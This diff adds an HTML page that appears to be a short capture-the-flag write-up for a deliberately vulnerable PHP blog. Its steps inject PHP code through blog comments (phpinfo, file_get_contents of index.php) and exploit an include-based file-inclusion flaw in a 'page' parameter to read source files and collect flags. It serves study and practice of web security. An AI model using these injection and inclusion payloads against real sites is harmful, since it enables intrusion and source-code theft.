@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Cody's First Blog</title>
+  <style>
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+    <head>
+      <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
+      <script type="text/javascript" src="../../js/common.js"></script>
+    </head>
+</head>
+<body>
+    <div id="header"><a class="header" href="../../index.html">[]|\|[-/-\|_/\/\[]|\||)</a></div>
+    <div id="content" class="content" style="width:70%;height:auto">
+<header id="title-block-header">
+<h1 class="title">Cody's First Blog</h1>
+</header>
+<p>Test path accessiblity</p>
+<pre><code>http://34.74.105.127/9ec2869b99/index.php</code></pre>
+<p>Create comment with body</p>
+<pre><code>  &lt;?php phpinfo() ?&gt;</code></pre>
+<p>Submit to get a flag</p>
+<p>By viewing page source found a path to admin login page</p>
+<pre><code>  http://34.74.105.127/9ec2869b99/?page=admin.auth.inc</code></pre>
+<p>Try another value of page</p>
+<pre><code>  http://34.74.105.127/9ec2869b99/?page=xx</code></pre>
+<p>An error message was received</p>
+<pre><code>  Warning: include(xx.php): failed to open stream: No such file or directory</code></pre>
+<p>So the value of page is a filename without suffix</p>
+<p>Keep on trying, seems subpath php.ini is accessible</p>
+<pre><code>  http://34.74.105.127/9ec2869b99/php.ini</code></pre>
+<p>Try another possible file name</p>
+<pre><code>  http://34.74.105.127/9ec2869b99/?page=admin.inc</code></pre>
+<p>It leads to a flag at the bottom of the response page</p>
+<p>Comment with content</p>
+<pre><code>  &lt;?php echo file_get_contents(&#39;index.php&#39;);?&gt;</code></pre>
+<p>Approve this comment in ‘Pending Comments’ page.</p>
+<p>Visit home page via</p>
+<pre><code>  http://34.74.105.127/9ec2869b99/?page=http://localhost/index</code></pre>
+<p>Found the 3rd flag in source code of <code>index.php</code></p>
+    </div>
+    <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
+</body>
+</html>
